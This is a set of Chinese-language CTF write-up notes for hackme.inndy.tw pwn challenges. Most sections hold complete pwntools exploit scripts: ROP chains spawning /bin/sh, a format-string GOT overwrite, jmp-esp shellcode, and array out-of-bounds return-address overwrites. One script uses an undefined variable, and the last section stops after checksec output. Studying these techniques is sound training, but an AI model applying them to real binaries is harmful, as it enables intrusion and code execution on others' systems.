# hackme.inndy.tw - Notes

## homework

看提示就知道考 array 越界問題

直接看 src code 

ask_name(); 中用的是 gets(name) << buf overflow ，不過 name 是 global 且在這裡用不到

然後有一個函數 call_me_maybe() 是 system("/bin/sh")

主要問題在 run_program() 中，他定義陣列大小是十但沒有限制 edit 的 index 範圍

故整個流程就是利用 edit 功能改 run_program() 的 ret 為 call_me_maybe() 即可

用 gdb 跟一下可以知道 array[0] 的位置是 ```ebp+index*4-0x34``` 

換句話說 ret = ebp + 0x4 = 0x38 / 4 = 14 

也就是 array[14] 是 ret 的位置

```python
#!/usr/bin/env python
from pwn import *

r = remote('hackme.inndy.tw', 7701)
#r = process('/tmp/p/a')

r.sendlineafter('? ','a')
r.sendlineafter('> ','1')
r.sendlineafter(': ','14')
r.sendlineafter('? ','134514171')
r.sendlineafter('> ','0')


r.interactive()
```


## ROP

用 ida pro 看很簡單就只有兩行
```c
char buf[12];
gets(buf);
```

然後是 x86 和 static ，所以就很明顯直接解

```
#!/usr/bin/env python
from pwn import *
context.arch = 'i386'
#r = process('/tmp/p/rop')
r = remote('hackme.inndy.tw',7704)

trash = 'a'*16
pop_eax_ret = 0x080b8016
push_es_int0x80 = 0x080b6d27
pop_dcb_ret = 0x0806ed00
bss = 0x080ed000 - 0x100
mov_dedx_eax_ret = 0x0805466b

payload = [pop_eax_ret, '/bin', pop_dcb_ret, bss, 0, 0,mov_dedx_eax_ret]
payload+= [pop_eax_ret, '//sh', pop_dcb_ret, bss+4, 0, 0, mov_dedx_eax_ret]
payload+= [pop_eax_ret, 0xb, pop_dcb_ret, 0, 0, bss, push_es_int0x80]

r.sendline(trash + flat(payload))
r.interactive()
```

## ROP2

這題改用 dynamic ，不過裡面有一個 syscall 

所以只要呼叫 syscall(0xb, '/bin/sh', 0, 0) 即可


```python 
#!/usr/bin/env python
from pwn import *
context.arch = 'i386'
#r = process('/tmp/p/rop2')
r = remote('hackme.inndy.tw', 7703)

trash = 'a'*16
syscall = 0x08048320
pop4_ret = 0x08048578
pop_deax_ret = 0x0804844e
pop_adc_ret = 0x0804843e
bss = 0x804a020 + 0x300
payload = [pop_adc_ret, bss, 0, 0, pop_deax_ret, '/bin', pop_adc_ret, bss+4, 0, 0]
payload+= [pop_deax_ret, '//sh', syscall, 0, 0xb, bss, 0, 0]

r.sendline(trash + flat(payload))

r.interactive()
```

## toooomuch

程式一開始會要你輸入 passcode ，可以用 gdb 跟一下

```
gdb-peda$ disass check_passcode
Dump of assembler code for function check_passcode:
   0x08048751 <+0>:     push   ebp
   0x08048752 <+1>:     mov    ebp,esp
   0x08048754 <+3>:     sub    esp,0x18
   0x08048757 <+6>:     sub    esp,0xc
   0x0804875a <+9>:     push   0x8049c60
   0x0804875f <+14>:    call   0x8048520 <atoi@plt>
   0x08048764 <+19>:    add    esp,0x10
   0x08048767 <+22>:    add    eax,0x3039
   0x0804876c <+27>:    mov    DWORD PTR [ebp-0xc],eax
   0x0804876f <+30>:    cmp    DWORD PTR [ebp-0xc],0xd903
   0x08048776 <+37>:    sete   al
   0x08048779 <+40>:    movzx  eax,al
   0x0804877c <+43>:    leave
   0x0804877d <+44>:    ret
End of assembler dump.
```

就是會把我們輸入的 加上0x3039 ，要等於 0xd903

所以要輸入 43210，之後就是 0 ~ 100 猜數字，用二分搜尋即可

```
#!/usr/bin/env python
from pwn import *

r = remote('hackme.inndy.tw', 7702)

r.sendlineafter(': ','43210')
r.sendlineafter(': ','50')
high = 100
low = 0
m = 50
while True:
	rev = r.recvline()
	print repr(rev)
	if rev == 'More please\n':
		low = m 
		m = (high + low) / 2
		r.sendlineafter(': ',str(m))
	elif rev == 'Toooomuch\n':
		high = m 
		m = (high + low) / 2
		r.sendlineafter(': ',str(m))
	else:
		break		
r.interactive()
```

## toooomuch-2

這題要拿 shell，保護沒開 ，然後題目提示 0x8048560

考觀念 hlt - 1 = jmp esp (僅適用在 x86)

```python
#!/usr/bin/env python
from pwn import *
context.arch = 'i386'
r = process('/tmp/p/a')

push_esp = 0x8048560
trash = 'a'*28
r.sendline(trash + p32(jmp_esp) + asm(shellcraft.sh()))

r.interactive()
```

## echo

這題就是很經典的 format string vuln ，然後也是最基本的練習題

先用 aaaa-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x 這樣算多少

之後先利用 %s 來 leak system@got 中的 system 位址，然後改 printf@got 為 system_addr

這樣之後 printf(buf) 實際等於 system(buf)

```python
#!/usr/bin/env python
from pwn import *

context.arch = 'i386'
#r = process('/tmp/p/a')
r = remote('hackme.inndy.tw', 7711)
system_got = 0x804a018
printf_got = 0x804a010

r.sendline(p32(system_got) + '%7$s')

system_addr = u32(r.recv()[4:8])
print "addr: ",hex(system_addr)

pay = fmtstr_payload(7, {printf_got: system_addr})
print "payload: ",repr(pay)

r.sendline(pay)

r.interactive()

```

## smashthestack

先看保護

```
$ checksec --file ./a
[*] '/tmp/p/a'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)

```

之後 ida pro 看，本地測試下需要先自行開一個檔名:flag ，然後裡面的內容要比 31 長才可以

之後她會讓你輸入一個 buf ，可以 overflow 然後觸發 stackguard

只要把 flag 的位址蓋到 argv[0] ，然後觸發 ```__stack_chk_fail()``` 就可以

我這邊就直接暴力，而不去算他位址了

直接一行解
```
$ python -c 'from pwn import * ; print p32(0x804a060)*50' | nc hackme.inndy.tw 7717
```


## echo2

x64 ，先看有哪些保護
```
[*] '/tmp/p/a'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```





